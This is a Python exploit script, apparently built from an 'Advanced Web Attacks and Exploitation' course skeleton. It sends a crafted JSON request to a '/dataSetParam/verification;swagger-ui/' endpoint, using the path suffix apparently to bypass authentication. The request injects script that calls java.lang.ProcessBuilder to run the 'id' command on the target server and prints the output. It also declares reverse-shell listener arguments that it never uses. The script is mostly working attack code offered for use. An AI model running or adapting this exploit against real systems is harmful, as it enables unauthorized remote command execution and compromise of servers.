#!/usr/bin/python3

import argparse
import json
import requests
import sys


# Interface class to display terminal messages
class Interface():
    def __init__(self):
        self.red = '\033[91m'
        self.green = '\033[92m'
        self.white = '\033[37m'
        self.yellow = '\033[93m'
        self.bold = '\033[1m'
        self.end = '\033[0m'

    def header(self):
        print('\n    >> Advanced Web Attacks and Exploitation')
        print('    >> Python Skeleton Script\n')

    def info(self, message):
        print(f"[{self.white}*{self.end}] {message}")

    def warning(self, message):
        print(f"[{self.yellow}!{self.end}] {message}")

    def error(self, message):
        print(f"[{self.red}x{self.end}] {message}")

    def success(self, message):
        print(f"[{self.green}✓{self.end}] {self.bold}{message}{self.end}")


def default_header():
    header = {
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0',
        'Accept-Encoding': 'gzip, deflate, br, zstd',
        'Accept': '*/*'
    }
    return header


def default_proxies():
    proxies = {
        "http": 'http://127.0.0.1:9003',
        "https": 'http://127.0.0.1:9003'
    }
    return proxies


def sendGet(url, header, debug):
    try:
        if debug is True:
            r = requests.get(url, headers=header, proxies=default_proxies())
        else:
            r = requests.get(url, headers=header)
    except requests.exceptions.ProxyError:
        output.error('Is your proxy running?')
        sys.exit(-1)
    return r


def sendPost(url, data, header, debug):
    try:
        if debug is True:
            r = requests.post(url=url, data=data, headers=header, proxies=default_proxies())
        else:
            r = requests.post(url=url, data=data, headers=header)
    except requests.exceptions.ProxyError:
        output.error('Is your proxy running?-')
        sys.exit(-1)
    return r


def main():
    # Parse Arguments
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', help='Target ip address or hostname', required=True)
    parser.add_argument('-li', '--localip', help='Listening IP address for reverse shell', required=False)
    parser.add_argument('-lp', '--port', help='Listening port for reverse shell', required=False)
    parser.add_argument('-u', '--username', help='Username to target', required=False)
    parser.add_argument('-p', '--password', help='Password value to set', required=False)
    parser.add_argument('-d', '--debug', help='Instruct our web requests to use our defined proxy', action='store_true',
                        required=False)
    args = parser.parse_args()

    # Instantiate our interface class
    global output
    output = Interface()

    # Banner
    output.header()

    # Debugging
    if args.debug:
        for k, v in sorted(vars(args).items()):
            if k == 'debug':
                output.warning(f"Debugging Mode: {v}")
            else:
                output.info(f"{k}: {v}")

    # Authentication Bypass
    #sendGet(f"http://{args.target}", args.debug)
    data="{\"ParamName\":\"\",\"paramDesc\":\"\",\"paramType\":\"\",\"sampleItem\":\"1\",\"mandatory\":true,\"requiredFlag\":1,\"validationRules\":\"function verification(data){a = new java.lang.ProcessBuilder(\\\"id\\\").start().getInputStream();r=new java.io.BufferedReader(new java.io.InputStreamReader(a));ss=\'\';while((line = r.readLine()) != null){ss+=line};return ss;}\"}"
    post_header = default_header()
    post_header['Content-Type'] = "application/json;charset=UTF-8"
    response = sendPost(f"http://{args.target}/dataSetParam/verification;swagger-ui/", data=data,header=post_header,debug=args.debug)
    if response.status_code == 200:
        output.success("command result:"+json.loads(response.text)['data'])

    # Remote Code Execution
    #sendGet(f"http://{args.target}", args.debug)

    # Try Harder
    output.success('Exploit has been successfully executed. :eyes: on your listener!')

if __name__ == '__main__':
    main()
